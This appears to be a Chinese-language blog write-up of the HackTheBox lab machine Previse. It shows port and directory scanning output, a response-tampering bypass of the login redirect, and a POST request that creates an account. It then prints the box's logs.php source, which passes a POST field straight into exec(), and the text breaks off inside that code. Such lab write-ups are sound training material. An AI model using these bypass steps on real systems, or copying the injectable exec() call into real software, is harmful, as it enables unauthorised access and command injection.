@@ -1,0 +1,713 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HackTheBox-PreviseRecon:12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 06:22:37 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 80&#x2F;tcp on 10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Previse">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Previse/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="HackTheBox-PreviseRecon:12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 06:22:37 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 80&#x2F;tcp on 10.1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517143451810.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517151142957.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517151200028.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517151239939.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517151447316.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517151652627.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517155219346.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517155729507.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517155748185.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.885Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:35.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220517143451810.png">
+  
+  
+  
+  <title>HackTheBox-Previse - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Previse"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          109 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Previse</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HackTheBox-Previse"><a href="#HackTheBox-Previse" class="headerlink" title="HackTheBox-Previse"></a>HackTheBox-Previse</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 06:22:37 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.104                                    <br>Discovered open port 22/tcp on 10.10.11.104 <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.104<br>Host is up (0.16s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)<br>|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)<br>|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| http-title: Previse Login<br>|_Requested resource was login.php<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.49 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://previse.htb<br>http://previse.htb [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220517143451810.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517143451810" style="zoom:200%;" />
+
+<p>都会被重定向：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://previse.htb -e php    <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940<br><br>Output File: /home/mosaictheory/.dirsearch/reports/previse.htb/_22-05-17_14-32-48.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_14-32-48.<span class="hljs-built_in">log</span><br><br>Target: http://previse.htb/<br>[14:33:11] 302 -    4KB - /accounts.php  -&gt;  login.php<br>[14:33:25] 200 -    0B  - /config.php<br>[14:33:27] 301 -  308B  - /css  -&gt;  http://previse.htb/css/<br>[14:33:29] 302 -    0B  - /download.php  -&gt;  login.php<br>[14:33:31] 200 -   15KB - /favicon.ico<br>[14:33:31] 302 -    5KB - /files.php  -&gt;  login.php<br>[14:33:31] 200 -  217B  - /footer.php<br>[14:33:32] 200 -  980B  - /header.php<br>[14:33:34] 302 -    3KB - /index.php  -&gt;  login.php<br>[14:33:34] 302 -    3KB - /index.php/login/  -&gt;  login.php<br>[14:33:35] 200 -    1KB - /js/<br>[14:33:35] 301 -  307B  - /js  -&gt;  http://previse.htb/js/<br>[14:33:38] 200 -    2KB - /login.php<br>[14:33:38] 302 -    0B  - /logout.php  -&gt;  login.php<br>[14:33:49] 403 -  276B  - /server-status<br>[14:33:49] 403 -  276B  - /server-status/<br>[14:33:52] 302 -    3KB - /status.php  -&gt;  login.php<br></code></pre></td></tr></table></figure>
+
+<p>浏览器访问会被重定向，但是curl是可以捕获到目标正常响应页面的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://previse.htb<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;<span class="hljs-built_in">head</span>&gt;<br>        &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    <br>            <br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Previse rocks your socks.&quot;</span> /&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;author&quot;</span> content=<span class="hljs-string">&quot;m4lwhere&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;shortcut icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;apple-touch-icon&quot;</span> sizes=<span class="hljs-string">&quot;180x180&quot;</span> href=<span class="hljs-string">&quot;/apple-touch-icon.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span> sizes=<span class="hljs-string">&quot;32x32&quot;</span> href=<span class="hljs-string">&quot;/favicon-32x32.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span> sizes=<span class="hljs-string">&quot;16x16&quot;</span> href=<span class="hljs-string">&quot;/favicon-16x16.png&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;manifest&quot;</span> href=<span class="hljs-string">&quot;/site.webmanifest&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/uikit.min.css&quot;</span> /&gt;<br>        &lt;script src=<span class="hljs-string">&quot;js/uikit.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script src=<span class="hljs-string">&quot;js/uikit-icons.min.js&quot;</span>&gt;&lt;/script&gt;<br>   <br><br>&lt;title&gt;Previse Home&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    <br>&lt;nav class=<span class="hljs-string">&quot;uk-navbar-container&quot;</span> uk-navbar&gt;<br>    &lt;div class=<span class="hljs-string">&quot;uk-navbar-center&quot;</span>&gt;<br>        &lt;ul class=<span class="hljs-string">&quot;uk-navbar-nav&quot;</span>&gt;<br>            &lt;li class=<span class="hljs-string">&quot;uk-active&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;/index.php&quot;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;accounts.php&quot;</span>&gt;ACCOUNTS&lt;/a&gt;<br>                &lt;div class=<span class="hljs-string">&quot;uk-navbar-dropdown&quot;</span>&gt;<br>                    &lt;ul class=<span class="hljs-string">&quot;uk-nav uk-navbar-dropdown-nav&quot;</span>&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;accounts.php&quot;</span>&gt;CREATE ACCOUNT&lt;/a&gt;&lt;/li&gt;<br>                    &lt;/ul&gt;<br>                &lt;/div&gt;<br>            &lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;files.php&quot;</span>&gt;FILES&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;status.php&quot;</span>&gt;MANAGEMENT MENU&lt;/a&gt;<br>                &lt;div class=<span class="hljs-string">&quot;uk-navbar-dropdown&quot;</span>&gt;<br>                    &lt;ul class=<span class="hljs-string">&quot;uk-nav uk-navbar-dropdown-nav&quot;</span>&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;status.php&quot;</span>&gt;WEBSITE STATUS&lt;/a&gt;&lt;/li&gt;<br>                        &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;file_logs.php&quot;</span>&gt;LOG DATA&lt;/a&gt;&lt;/li&gt;<br>                    &lt;/ul&gt;<br>                &lt;/div&gt;<br>            &lt;/li&gt;<br>            &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;#&quot;</span> class=<span class="hljs-string">&quot;.uk-text-uppercase&quot;</span>&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;<br>            &lt;li&gt;<br>                &lt;a href=<span class="hljs-string">&quot;logout.php&quot;</span>&gt;<br>                    &lt;button class=<span class="hljs-string">&quot;uk-button uk-button-default uk-button-small&quot;</span>&gt;LOG OUT&lt;/button&gt;<br>                &lt;/a&gt;<br>            &lt;/li&gt;<br>        &lt;/ul&gt;<br>    &lt;/div&gt;<br>&lt;/nav&gt;<br><br>    &lt;section class=<span class="hljs-string">&quot;uk-section uk-section-default&quot;</span>&gt;<br>        &lt;div class=<span class="hljs-string">&quot;uk-container&quot;</span>&gt;<br>            &lt;h2 class=<span class="hljs-string">&quot;uk-heading-divider&quot;</span>&gt;Previse File Hosting&lt;/h2&gt;<br>            &lt;p&gt;Previse File Hosting Service Management.&lt;/p&gt;<br>            &lt;p&gt;Don<span class="hljs-string">&#x27;t have an account? Create one!&lt;/p&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/section&gt;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">&lt;div class=&quot;uk-position-bottom-center uk-padding-small&quot;&gt;</span><br><span class="hljs-string">	&lt;a href=&quot;https://m4lwhere.org/&quot; target=&quot;_blank&quot;&gt;&lt;button class=&quot;uk-button uk-button-text uk-text-small&quot;&gt;Created by m4lwhere&lt;/button&gt;&lt;/a&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可能该重定向是在前端。</p>
+<img src="https://www.worldisend.com/img/image-20220517151142957.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517151142957" style="zoom:200%;" />
+
+<img src="https://www.worldisend.com/img/image-20220517151200028.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517151200028" style="zoom:200%;" />
+
+<p>可以手动把302改成200：</p>
+<img src="https://www.worldisend.com/img/image-20220517151239939.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517151239939" style="zoom:200%;" />
+
+<p>一样的，选择ACCOUNTS：</p>
+<img src="https://www.worldisend.com/img/image-20220517151447316.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517151447316" style="zoom:200%;" />
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/accounts.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>previse.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://previse.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://previse.htb/accounts.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8j4orelok55b33gs1djn3105m3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts"><span class="hljs-attr">username</span><span class="hljs-operator">=</span>hacker<span class="hljs-variable">&amp;password</span>=whoami<span class="hljs-variable">&amp;confirm</span>=whoami<span class="hljs-variable">&amp;submit</span>=</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220517151652627.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517151652627" style="zoom:200%;" />
+
+<p>可以正式登录了，而且我可以下载到目标的源码：</p>
+<p><img src="https://www.worldisend.com/img/image-20220517155219346.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517155219346"></p>
+<p>在logs.php文件中，会有PHP一些危险函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-comment">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//</span><br><span class="hljs-comment">/////////////////////////////////////////////////////////////////////////////////////</span><br><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/usr/bin/python /opt/scripts/log_process.py <span class="hljs-subst">&#123;$_POST[&#x27;delim&#x27;]&#125;</span>&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&quot;/var/www/out.log&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;out.log&quot;</span>;    <br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filepath</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filepath</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>    <span class="hljs-title function_ 